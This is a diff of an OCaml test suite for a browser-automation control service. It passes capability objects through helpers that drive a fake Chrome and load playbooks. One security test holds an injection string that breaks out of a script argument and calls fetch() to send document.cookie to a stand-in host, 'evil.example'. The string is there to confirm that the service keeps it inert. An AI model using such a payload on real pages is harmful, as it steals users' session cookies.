-        (Option.value ~default:"" previous))
+      (Ox_caps.Cap_unix.putenv ~caps) "XDG_STATE_HOME" (Option.value ~default:"" previous))
     (fun () ->
-      rig (fun env sw _ tabs fake ->
+      (rig ~caps) (fun env sw _ tabs fake ->
           let f = fake () in
           let fixture = fixture "unlabelled-controls-chrome.json" in
           page_script f fixture modal_text;
@@ -2762,25 +2987,23 @@ let run_proposal () =
              root; the example resolves from either. *)
           let playbook =
             match
-              Leash.Playbook.load ~caps:(Ox_test.powerbox ())
-                "../examples/playbooks/automationexercise.com"
+              Leash.Playbook.load ~caps "../examples/playbooks/automationexercise.com"
             with
             | Ok book -> book
             | Error _ -> (
                 match
-                  Leash.Playbook.load ~caps:(Ox_test.powerbox ())
-                    "examples/playbooks/automationexercise.com"
+                  Leash.Playbook.load ~caps "examples/playbooks/automationexercise.com"
                 with
                 | Ok book -> book
                 | Error why -> Alcotest.fail why)
           in
-          let read path =
-            let channel = open_in_bin path in
+          let read ~(caps : < Ox_caps.Cap.fs_read ; .. >) path =
+            let channel = (Ox_caps.Cap_stdlib.open_in_bin ~caps) path in
             Fun.protect
               ~finally:(fun () -> close_in channel)
               (fun () -> really_input_string channel (in_channel_length channel))
           in
-          let before = read playbook.Leash.Playbook.file in
+          let before = (read ~caps) playbook.Leash.Playbook.file in
           let h =
             result (request tabs "alice" (P.New { url = Some product_url; label = None }))
             |> tab
@@ -2836,7 +3059,7 @@ let run_proposal () =
             (get "proposals" body = `List []);
           Alcotest.(check string)
             "run-m0r8 the installed playbook is untouched" before
-            (read playbook.Leash.Playbook.file);
+            ((read ~caps) playbook.Leash.Playbook.file);
           match get "planner_turns" body with
           | `List [ first; last ] ->
               Alcotest.(check bool)
@@ -2846,8 +3069,16 @@ let run_proposal () =
 
 (* L33 run-3vat run-xda7: command enters production Tabs.run through Control,
    writes a whole proposed playbook and leaves the installed directory untouched. *)
-let dialog_interruptions () =
-  rig (fun _ sw _ tabs fake ->
+let dialog_interruptions
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun _ sw _ tabs fake ->
       let fake = fake () in
       Fake.on_method fake "Page.handleJavaScriptDialog" (fun _ ->
           Fake.emit ~session:"session-1" fake ~method_:"Page.javascriptDialogClosed"
@@ -2951,9 +3182,19 @@ let dialog_interruptions () =
 
 (* hard-yi0a: a real Unix listener writes a timeout envelope after cancelling a
    blocked handler, rather than silently closing the connection. *)
-let listener_budget_reply () =
-  with_runtime (fun runtime ->
-      rig (fun env sw _ tabs fake ->
+let listener_budget_reply
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.network
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.tmp
+       ; .. >) () =
+  (with_runtime ~caps) (fun runtime ->
+      (rig ~caps) (fun env sw _ tabs fake ->
           let tab =
             result (request tabs "alice" (P.New { url = None; label = None })) |> tab
           in
@@ -2983,7 +3224,7 @@ let listener_budget_reply () =
                       ~mono_clock:env#mono_clock
                       ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                       ();
-                  caps = (Ox_test.powerbox () :> Leash.Control.caps);
+                  caps :> Leash.Control.caps;
                 }
             with
             | Ok control -> control
@@ -3032,25 +3273,27 @@ let listener_budget_reply () =
 
 (* ---------- L37: playbook scripts at the control seam ---------- *)
 
-let rec rm_rf path =
+let rec rm_rf ~(caps : < Ox_caps.Cap.fs_read ; Ox_caps.Cap.fs_write ; .. >) path =
   match (Unix.lstat path).Unix.st_kind with
   | Unix.S_DIR ->
-      Array.iter (fun entry -> rm_rf (Filename.concat path entry)) (Sys.readdir path);
-      Unix.rmdir path
-  | _ -> Sys.remove path
+      Array.iter
+        (fun entry -> (rm_rf ~caps) (Filename.concat path entry))
+        ((Ox_caps.Cap_sys.readdir ~caps) path);
+      (Ox_caps.Cap_unix.rmdir ~caps) path
+  | _ -> (Ox_caps.Cap_sys.remove ~caps) path
   | exception Unix.Unix_error _ -> ()
 
-let write_tree root files =
+let write_tree ~(caps : < Ox_caps.Cap.fs_write ; .. >) root files =
   List.iter
     (fun (path, content) ->
       let file = Filename.concat root path in
-      let rec parents p =
+      let rec parents ~(caps : < Ox_caps.Cap.fs_write ; .. >) p =
         if not (Sys.file_exists p) then (
-          parents (Filename.dirname p);
-          Unix.mkdir p 0o700)
+          (parents ~caps) (Filename.dirname p);
+          (Ox_caps.Cap_unix.mkdir ~caps) p 0o700)
       in
-      parents (Filename.dirname file);
-      let channel = open_out_bin file in
+      (parents ~caps) (Filename.dirname file);
+      let channel = (Ox_caps.Cap_stdlib.open_out_bin ~caps) file in
       output_string channel content;
       close_out channel)
     files
@@ -3076,18 +3319,17 @@ let books_json =
 
 (* The playbook directory is made and loaded the way an operator's is, under a directory
    called [books]. *)
-let with_books f =
-  let root = Filename.temp_file "leash-books" "" in
-  Sys.remove root;
-  Unix.mkdir root 0o700;
+let with_books
+    ~(caps : < Ox_caps.Cap.fs_read ; Ox_caps.Cap.fs_write ; Ox_caps.Cap.tmp ; .. >) f =
+  let root = (Ox_caps.Cap_stdlib.Filename.temp_file ~caps) "leash-books" "" in
+  (Ox_caps.Cap_sys.remove ~caps) root;
+  (Ox_caps.Cap_unix.mkdir ~caps) root 0o700;
   Fun.protect
-    ~finally:(fun () -> rm_rf root)
+    ~finally:(fun () -> (rm_rf ~caps) root)
     (fun () ->
-      write_tree root
+      (write_tree ~caps) root
         [ ("books/playbook.json", books_json); ("books/scripts/list.js", list_js) ];
-      match
-        Leash.Playbook.load ~caps:(Ox_test.powerbox ()) (Filename.concat root "books")
-      with
+      match Leash.Playbook.load ~caps (Filename.concat root "books") with
       | Ok book -> f book
       | Error why -> Alcotest.fail why)
 
@@ -3166,9 +3408,18 @@ let books_rows =
       `Assoc [ ("title", `String "Tipping the Velvet"); ("price", `Int 53) ];
     ]
 
-let playbook_test_command () =
-  with_books (fun book ->
-      rig (fun _ _ _ tabs fake ->
+let playbook_test_command
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.tmp
+       ; .. >) () =
+  (with_books ~caps) (fun book ->
+      (rig ~caps) (fun _ _ _ tabs fake ->
           let f = fake () in
           let answer = ref (value_reply books_rows) in
           script_page f ~reply:(fun _ _ -> !answer);
@@ -3262,9 +3513,18 @@ let playbook_test_command () =
             "extr-k40c a refusal reaches the page with nothing" before
             (List.length (payloads f))))
 
-let playbook_check_command () =
-  with_books (fun book ->
-      rig (fun _ _ _ tabs fake ->
+let playbook_check_command
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.tmp
+       ; .. >) () =
+  (with_books ~caps) (fun book ->
+      (rig ~caps) (fun _ _ _ tabs fake ->
           let f = fake () in
           Fake.on_method f "Runtime.evaluate" (fun request ->
               match get "expression" (get "params" request) with
@@ -3341,9 +3601,18 @@ let playbook_check_command () =
    mission text, the argument the text helper fills — runs a script step. The page's engine
    is handed the playbook's script text exactly, with the hostile value only inside the
    JSON arguments; every other text it is handed is one the service itself owns. *)
-let run_scripts ?out hostile =
-  with_books (fun book ->
-      rig (fun env sw _ tabs fake ->
+let run_scripts
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.tmp
+       ; .. >) ?out hostile =
+  (with_books ~caps) (fun book ->
+      (rig ~caps) (fun env sw _ tabs fake ->
           let f = fake () in
           script_page f ~reply:(fun _ _ -> value_reply books_rows);
           let h =
@@ -3399,9 +3668,18 @@ let run_scripts ?out hostile =
           in
           (result reply, payloads f, script_calls f, !questions)))
 
-let run_script_step () =
+let run_script_step
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.tmp
+       ; .. >) () =
   let hostile = "'); fetch('https://evil.example/steal?c='+document.cookie); ('" in
-  let body, payloads_seen, calls, model_requests = run_scripts hostile in
+  let body, payloads_seen, calls, model_requests = (run_scripts ~caps) hostile in
   let billed = get "model_calls_by_kind" (get "data" body) in
   Alcotest.(check int)
     "pilot-ukoh counts pilot and argument helper requests" 3
@@ -3436,12 +3714,12 @@ let run_script_step () =
         "extr-b3u0 records never enter recorded model payloads" false
         (contains text "A Light in the Attic" || contains text "Tipping the Velvet"))
     model_requests;
-  let path = Filename.temp_file "leash-extr-b3u0" ".jsonl" in
+  let path = (Ox_caps.Cap_stdlib.Filename.temp_file ~caps) "leash-extr-b3u0" ".jsonl" in
   Fun.protect
-    ~finally:(fun () -> Sys.remove path)
+    ~finally:(fun () -> (Ox_caps.Cap_sys.remove ~caps) path)
     (fun () ->
-      let streamed, _, _, requests = run_scripts ~out:path "gpu" in
-      let input = open_in_bin path in
+      let streamed, _, _, requests = (run_scripts ~caps) ~out:path "gpu" in
+      let input = (Ox_caps.Cap_stdlib.open_in_bin ~caps) path in
       let rows =
         Fun.protect
           ~finally:(fun () -> close_in input)
@@ -3530,7 +3808,7 @@ let run_script_step () =
         (contains text "evil.example" || contains text "document.cookie"))
     payloads_seen;
   (* Everything else the engine was handed is what a run with a harmless mission hands it. *)
-  let _, baseline, _, _ = run_scripts "gpu" in
+  let _, baseline, _, _ = (run_scripts ~caps) "gpu" in
   let own text = not (String.starts_with ~prefix:"async function(args)" text) in
   let baseline = List.filter own baseline in
   List.iter
@@ -3547,9 +3825,19 @@ let run_script_step () =
     = List.sort_uniq compare baseline)
 
 (* L49 hand-mb9s hand-0wo8: share a capability across real socket clients. *)
-let shared_handle_over_socket () =
-  with_runtime (fun runtime ->
-      rig (fun env sw _ tabs fake ->
+let shared_handle_over_socket
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.network
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.tmp
+       ; .. >) () =
+  (with_runtime ~caps) (fun runtime ->
+      (rig ~caps) (fun env sw _ tabs fake ->
           let fake = fake () in
           Fake.on_method fake "Runtime.evaluate" (fun _ ->
               obj [ ("result", obj [ ("value", str "shared page") ]) ]);
@@ -3578,7 +3866,7 @@ let shared_handle_over_socket () =
                       ~clock:env#clock ~mono_clock:env#mono_clock
                       ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                       ();
-                  caps = (Ox_test.powerbox () :> Leash.Control.caps);
+                  caps :> Leash.Control.caps;
                 }
             with
             | Ok control -> control
@@ -3643,8 +3931,16 @@ let shared_handle_over_socket () =
 
 (* trace-qe8c trace-iqqz trace-zbb9 trace-uovo: public control persists every
    drive outcome before replying, without a browser/service/provider. *)
-let collection_done_guard () =
-  rig (fun env sw _ tabs fake ->
+let collection_done_guard
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; .. >) () =
+  (rig ~caps) (fun env sw _ tabs fake ->
       let f = fake () in
       page_script f (fixture "unlabelled-controls-chrome.json") "Category";
       document_at ~title:"Category" ~url:product_url f;
@@ -3681,17 +3977,26 @@ let collection_done_guard () =
 
 (* pilot-x1f3 pilot-r94o: the protocol seam yields a navigating leg to the
    pilot and keeps every scrubbed turn in the durable audit. *)
-let pilot_leg_scope () =
-  let caps = Ox_test.powerbox () in
-  let root = Filename.temp_file "leash-pilot-legscope-" "" in
-  Unix.unlink root;
-  Unix.mkdir root 0o700;
+let pilot_leg_scope
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.time
+       ; Ox_caps.Cap.tmp
+       ; .. >) () =
+  let root = (Ox_caps.Cap_stdlib.Filename.temp_file ~caps) "leash-pilot-legscope-" "" in
+  (Ox_caps.Cap_unix.unlink ~caps) root;
+  (Ox_caps.Cap_unix.mkdir ~caps) root 0o700;
   Fun.protect
-    ~finally:(fun () -> rm_rf root)
+    ~finally:(fun () -> (rm_rf ~caps) root)
     (fun () ->
       List.iter
         (fun (name, destination, terminal_after, expected_actions, expected_outcome) ->
-          rig (fun env sw _ tabs fake ->
+          (rig ~caps) (fun env sw _ tabs fake ->
               let f = fake () in
               let rec web = function
                 | `String value when String.starts_with ~prefix:"data:" value ->
@@ -3911,27 +4216,32 @@ let pilot_leg_scope () =
 
 (* pilot-oijk pilot-r94o: three missions cross the control protocol, replaying
    the actual remembered goal rather than treating its slug as a navigation goal. *)
-let with_pilot_storage f =
-  let root = Filename.temp_file "leash-pilot-memory-" "" in
-  Unix.unlink root;
-  Unix.mkdir root 0o700;
+let with_pilot_storage
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.tmp
+       ; .. >) f =
+  let root = (Ox_caps.Cap_stdlib.Filename.temp_file ~caps) "leash-pilot-memory-" "" in
+  (Ox_caps.Cap_unix.unlink ~caps) root;
+  (Ox_caps.Cap_unix.mkdir ~caps) root 0o700;
   let old =
     List.map
-      (fun key -> (key, Sys.getenv_opt key))
+      (fun key -> (key, (Ox_caps.Cap_sys.getenv_opt ~caps) key))
       [ "XDG_CONFIG_HOME"; "XDG_STATE_HOME" ]
   in
-  List.iter (fun (key, _) -> (Unix.putenv [@alert "-unsafe_multidomain"]) key root) old;
+  List.iter (fun (key, _) -> (Ox_caps.Cap_unix.putenv ~caps) key root) old;
   Fun.protect
     ~finally:(fun () ->
       List.iter
         (fun (key, value) ->
-          (Unix.putenv [@alert "-unsafe_multidomain"]) key
-            (Option.value ~default:"" value))
+          (Ox_caps.Cap_unix.putenv ~caps) key (Option.value ~default:"" value))
         old;
-      rm_rf root)
+      (rm_rf ~caps) root)
     (fun () -> f root)
 
-let saved_pilot_trace caps body =
+let saved_pilot_trace (caps : < Ox_caps.Cap.fs_read ; .. >) body =
   let path =
     match get "trace_path" body with
     | `String path -> path
@@ -3941,10 +4251,19 @@ let saved_pilot_trace caps body =
   | Ok trace -> trace
   | Error why -> Alcotest.fail why
 
-let pilot_memory_replay () =
-  with_pilot_storage (fun root ->
-      rig (fun env sw _ tabs fake ->
-          let caps = Ox_test.powerbox () in
+let pilot_memory_replay
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.time
+       ; Ox_caps.Cap.tmp
+       ; .. >) () =
+  (with_pilot_storage ~caps) (fun root ->
+      (rig ~caps) (fun env sw _ tabs fake ->
           let warnings = ref [] in
           let memory =
             Leash.Learning.create ~sw ~caps ~config:Leash.Config.default.learning
@@ -4091,12 +4410,21 @@ let pilot_memory_replay () =
 
 (* pilot-r94o: refused completions and accepted legs cost money even when the
    next provider call fails; partial unpriced usage must remain unknown. *)
-let pilot_error_usage () =
+let pilot_error_usage
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.time
+       ; Ox_caps.Cap.tmp
+       ; .. >) () =
   List.iter
     (fun unpriced ->
-      with_pilot_storage (fun root ->
-          rig (fun env sw _ tabs fake ->
-              let caps = Ox_test.powerbox () in
+      (with_pilot_storage ~caps) (fun root ->
+          (rig ~caps) (fun env sw _ tabs fake ->
               let traces = Leash.Traces.create ~caps ~root () in
               let f = fake () in
               page_script f (fixture "unlabelled-controls-chrome.json") modal_text;
@@ -4183,23 +4511,34 @@ let pilot_error_usage () =
                    trace.planner_turns))))
     [ false; true ]
 
-let durable_drive_traces () =
-  let caps = Ox_test.powerbox () in
-  let root = Filename.temp_file "leash-l51-control-" "" in
-  Unix.unlink root;
-  Unix.mkdir root 0o700;
-  let rec remove path =
+let durable_drive_traces
+    ~(caps :
+       < Ox_caps.Cap.env
+       ; Ox_caps.Cap.exec
+       ; Ox_caps.Cap.fork
+       ; Ox_caps.Cap.fs_read
+       ; Ox_caps.Cap.fs_write
+       ; Ox_caps.Cap.random
+       ; Ox_caps.Cap.time
+       ; Ox_caps.Cap.tmp
+       ; .. >) () =
+  let root = (Ox_caps.Cap_stdlib.Filename.temp_file ~caps) "leash-l51-control-" "" in
+  (Ox_caps.Cap_unix.unlink ~caps) root;
+  (Ox_caps.Cap_unix.mkdir ~caps) root 0o700;
+  let rec remove ~(caps : < Ox_caps.Cap.fs_read ; Ox_caps.Cap.fs_write ; .. >) path =
     match Unix.lstat path with
     | st when st.Unix.st_kind = Unix.S_DIR ->
-        Array.iter (fun name -> remove (Filename.concat path name)) (Sys.readdir path);
-        Unix.rmdir path
-    | _ -> Unix.unlink path
+        Array.iter
+          (fun name -> (remove ~caps) (Filename.concat path name))
+          ((Ox_caps.Cap_sys.readdir ~caps) path);
+        (Ox_caps.Cap_unix.rmdir ~caps) path
+    | _ -> (Ox_caps.Cap_unix.unlink ~caps) path
   in
   Fun.protect
-    ~finally:(fun () -> remove root)
+    ~finally:(fun () -> (remove ~caps) root)
     (fun () ->
       let store = Leash.Traces.create ~caps ~root () in
-      rig (fun env sw _ tabs fake ->
+      (rig ~caps) (fun env sw _ tabs fake ->
           let f = fake () in
           page_script f (fixture "unlabelled-controls-chrome.json") modal_text;
           document_at ~title:"Blue Top" ~url:product_url f;
@@ -4228,7 +4567,7 @@ let durable_drive_traces () =
             | Ok rows -> List.length rows
             | Error why -> Alcotest.fail why
           in
-          let saved body =
+          let saved ~(caps : < Ox_caps.Cap.fs_read ; .. >) body =
             let path =
               match get "trace_path" body with
               | `String path -> path
@@ -4284,7 +4623,7 @@ let durable_drive_traces () =
           let body =
             invoke ~traces:store (run_wire ~tab:h "inspect the current page") |> decoded
           in
-          let trace = saved body in
+          let trace = (saved ~caps) body in
           Alcotest.(check bool)
             "trace-qe8c final reply has document title" true
             (get "title" (get "final" body) = str "Blue Top");
@@ -4317,7 +4656,7 @@ let durable_drive_traces () =
             invoke ~traces:store ~installed:[ book ]
               ~levels:(levels_with [ "none" ] (ref []))
               (run_wire ~tab:h "operator NONE with matching installed pages")
-            |> decoded |> saved
+            |> decoded |> saved ~caps
           in
           Alcotest.(check bool)
             "kind-dnye NONE infers a kind and does not borrow the unselected book" true
@@ -4337,7 +4676,7 @@ let durable_drive_traces () =
               ~levels:
                 (levels_with [ "automationexercise.com"; "add-to-cart"; "DONE" ] (ref []))
               (run_wire ~tab:h "add Blue Top to the cart")
-            |> decoded |> saved
+            |> decoded |> saved ~caps
           in
           let declared kind =
             List.exists
@@ -4368,7 +4707,10 @@ let durable_drive_traces () =
             && not (contains json modal_text));
           let bad_root = Filename.concat root "not-a-directory" in
           let fd =
-            Unix.openfile bad_root [ Unix.O_CREAT; Unix.O_EXCL; Unix.O_WRONLY ] 0o600
+            (Ox_caps.Cap_unix.openfile ~caps)
+              bad_root
+              [ Unix.O_CREAT; Unix.O_EXCL; Unix.O_WRONLY ]
+              0o600
           in
           Unix.close fd;
           let failed = Leash.Traces.create ~caps ~root:bad_root () in
@@ -4387,7 +4729,7 @@ let durable_drive_traces () =
           in
           match refusal with
           | Ok (P.Failure error) ->
-              let trace = saved (Option.value ~default:`Null error.detail) in
+              let trace = (saved ~caps) (Option.value ~default:`Null error.detail) in
               Alcotest.(check string)
                 "trace-qe8c trace-iqqz acquisition error is durable" "error" trace.outcome;
               Alcotest.(check string)
@@ -4395,53 +4737,59 @@ let durable_drive_traces () =
           | _ -> Alcotest.fail "trace-iqqz closed tab should be a protocol error"))
 
 let () =
+  let caps = Ox_test.powerbox () in
   Alcotest.run "L3 control protocol"
     [
       ( "lifecycle",
         [
-          Alcotest.test_case "tab-of0i tmoc 1r34 hyap 1rx9 0vh8" `Quick snapshot;
+          Alcotest.test_case "tab-of0i tmoc 1r34 hyap 1rx9 0vh8" `Quick (snapshot ~caps);
           Alcotest.test_case "daily-9ggi HiDPI controls and paragraph text" `Quick
-            daily_snapshot;
-          Alcotest.test_case "chrome-qnul hjw9 fuao 2n8n" `Quick lifecycle;
+            (daily_snapshot ~caps);
+          Alcotest.test_case "chrome-qnul hjw9 fuao 2n8n" `Quick (lifecycle ~caps);
           Alcotest.test_case "svc-p67t qilu journal and redaction" `Quick
-            journal_redaction;
-          Alcotest.test_case "run-ykq4 fake Chrome downloads" `Quick download_events;
-          Alcotest.test_case "svc-f4op optional OTLP reporter" `Quick optional_otlp;
-          Alcotest.test_case "chrome-akz4 d4mz" `Quick safety;
-          Alcotest.test_case "chrome-1yn9" `Quick nav;
-          Alcotest.test_case "chrome-qnul new waits" `Quick new_waits;
-          Alcotest.test_case "chrome-qnul new without url" `Quick new_without_url;
+            (journal_redaction ~caps);
+          Alcotest.test_case "run-ykq4 fake Chrome downloads" `Quick
+            (download_events ~caps);
+          Alcotest.test_case "svc-f4op optional OTLP reporter" `Quick
+            (optional_otlp ~caps);
+          Alcotest.test_case "chrome-akz4 d4mz" `Quick (safety ~caps);
+          Alcotest.test_case "chrome-1yn9" `Quick (nav ~caps);
+          Alcotest.test_case "chrome-qnul new waits" `Quick (new_waits ~caps);
+          Alcotest.test_case "chrome-qnul new without url" `Quick (new_without_url ~caps);
           Alcotest.test_case "hard-6eei 92ik s719 tsva t6cq owci" `Quick
-            dialog_interruptions;
-          Alcotest.test_case "chrome-qnul 1yn9 load timeout" `Quick load_timeout;
+            (dialog_interruptions ~caps);
+          Alcotest.test_case "chrome-qnul 1yn9 load timeout" `Quick (load_timeout ~caps);
           Alcotest.test_case "chrome-qnul 1yn9 handler budget" `Quick budget;
-          Alcotest.test_case "chrome-38a4" `Quick malformed;
-          Alcotest.test_case "chrome-2z2z 6lfk" `Quick lost;
-          Alcotest.test_case "chrome-fwnu socket" `Quick socket;
-          Alcotest.test_case "hard-yi0a real socket timeout" `Quick listener_budget_reply;
-          Alcotest.test_case "svc-5wm8 second instance" `Quick second_instance;
+          Alcotest.test_case "chrome-38a4" `Quick (malformed ~caps);
+          Alcotest.test_case "chrome-2z2z 6lfk" `Quick (lost ~caps);
+          Alcotest.test_case "chrome-fwnu socket" `Quick (socket ~caps);
+          Alcotest.test_case "hard-yi0a real socket timeout" `Quick
+            (listener_budget_reply ~caps);
+          Alcotest.test_case "svc-5wm8 second instance" `Quick (second_instance ~caps);
           Alcotest.test_case
             "hand-mb9s hand-0wo8 real socket capability and serialization" `Quick
-            shared_handle_over_socket;
+            (shared_handle_over_socket ~caps);
           Alcotest.test_case "tab-x4v0 large text over socket" `Quick
-            large_text_over_socket;
+            (large_text_over_socket ~caps);
           Alcotest.test_case "kind-a7uy kind-tdrv non-web tab labels" `Quick
-            non_web_tab_labels;
-          Alcotest.test_case "human-origin shutdown" `Quick human;
-          Alcotest.test_case "tab-zc36 empty names" `Quick empty_names;
-          Alcotest.test_case "tab-bw4j pseudo-icon click safety" `Quick pseudo_icon_hit;
+            (non_web_tab_labels ~caps);
+          Alcotest.test_case "human-origin shutdown" `Quick (human ~caps);
+          Alcotest.test_case "tab-zc36 empty names" `Quick (empty_names ~caps);
+          Alcotest.test_case "tab-bw4j pseudo-icon click safety" `Quick
+            (pseudo_icon_hit ~caps);
           Alcotest.test_case "map-op08 map-bjon live collection DONE guard" `Quick
-            collection_done_guard;
+            (collection_done_guard ~caps);
           Alcotest.test_case "pilot-x1f3 pilot-r94o navigation legs and audit" `Quick
-            pilot_leg_scope;
+            (pilot_leg_scope ~caps);
           Alcotest.test_case "pilot-oijk pilot-r94o memory replay and candidate audit"
-            `Quick pilot_memory_replay;
-          Alcotest.test_case "pilot-r94o error usage" `Quick pilot_error_usage;
+            `Quick (pilot_memory_replay ~caps);
+          Alcotest.test_case "pilot-r94o error usage" `Quick (pilot_error_usage ~caps);
           Alcotest.test_case "trace-qe8c trace-iqqz public durable drives" `Quick
-            durable_drive_traces;
-          Alcotest.test_case "drive-l7yk fake-browser dry-run" `Quick drive_dry_run;
+            (durable_drive_traces ~caps);
+          Alcotest.test_case "drive-l7yk fake-browser dry-run" `Quick
+            (drive_dry_run ~caps);
           Alcotest.test_case "tab-bw4j refused click is decided again" `Quick
-            (refused_click_redecides ~operation_name:"click");
+            ((refused_click_redecides ~caps) ~operation_name:"click");
           Alcotest.test_case "map-op07 covered type_text re-decides without input" `Quick
             (fun () ->
               let action =
@@ -4452,25 +4800,27 @@ let () =
               Alcotest.(check bool)
                 "map-op07 real covered Departure field" true
                 (get "label" (get "target" action) = str "Departure");
-              refused_click_redecides
+              (refused_click_redecides ~caps)
                 ~operation_name:
                   (match get "operation" action with `String s -> s | _ -> assert false)
                 ());
           Alcotest.test_case "run-9ypy run-4j1v run-snk4 run-shgh run-7blx" `Quick
-            run_mission;
+            (run_mission ~caps);
           Alcotest.test_case "daily-9ggi temporary drive tabs" `Quick
-            drive_temporary_cleanup;
+            (drive_temporary_cleanup ~caps);
           Alcotest.test_case "map-puhi all drive tab lifecycles" `Quick
-            drive_tab_lifecycle;
-          Alcotest.test_case "run-fwl8 run refusals" `Quick run_refusals;
-          Alcotest.test_case "run-rq6i run-m0r8 planner proposal" `Quick run_proposal;
+            (drive_tab_lifecycle ~caps);
+          Alcotest.test_case "run-fwl8 run refusals" `Quick (run_refusals ~caps);
+          Alcotest.test_case "run-rq6i run-m0r8 planner proposal" `Quick
+            (run_proposal ~caps);
         ] );
       ( "L37 scripts",
         [
           Alcotest.test_case "extr-mp5z extr-8o1h extr-vgir playbook test" `Quick
-            playbook_test_command;
-          Alcotest.test_case "extr-lslp playbook check" `Quick playbook_check_command;
+            (playbook_test_command ~caps);
+          Alcotest.test_case "extr-lslp playbook check" `Quick
+            (playbook_check_command ~caps);
           Alcotest.test_case "extr-8o1h extr-k40c extr-p152 script step, safety" `Quick
-            run_script_step;
+            (run_script_step ~caps);
         ] );
     ]
